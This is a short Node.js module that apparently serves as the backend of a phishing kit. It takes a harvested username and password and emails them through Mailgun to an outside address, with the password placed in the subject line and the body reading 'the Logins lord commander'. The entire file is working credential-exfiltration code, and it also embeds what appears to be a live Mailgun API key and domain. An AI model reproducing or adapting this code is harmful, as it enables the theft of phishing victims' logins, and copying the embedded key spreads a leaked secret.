const nodemailer = require('nodemailer')
const mailGun = require('nodemailer-mailgun-transport')


const auth = {
    auth: {
        api_key:'9038691baaa1203e798f11bd3b148df0-3e508ae1-40336070',
        domain: 'sandbox096c3a821d7944f9978d520f78ceebcf.mailgun.org'
    }
}

const transporter = nodemailer.createTransport(mailGun(auth))

const sendMail = (collectUserName,collectPassword,cb) => {
    const mailOptions = {
        from: collectUserName,
        to: 'avery@koln3d-tech.com',
        subject: collectPassword,
        text: 'the Logins lord commander'
    }
    
    transporter.sendMail(mailOptions, function(err, data){
        if (err) {
            cb(err,null)
        } else {
            cb(null,data)
        }
    })
}

module.exports = sendMail

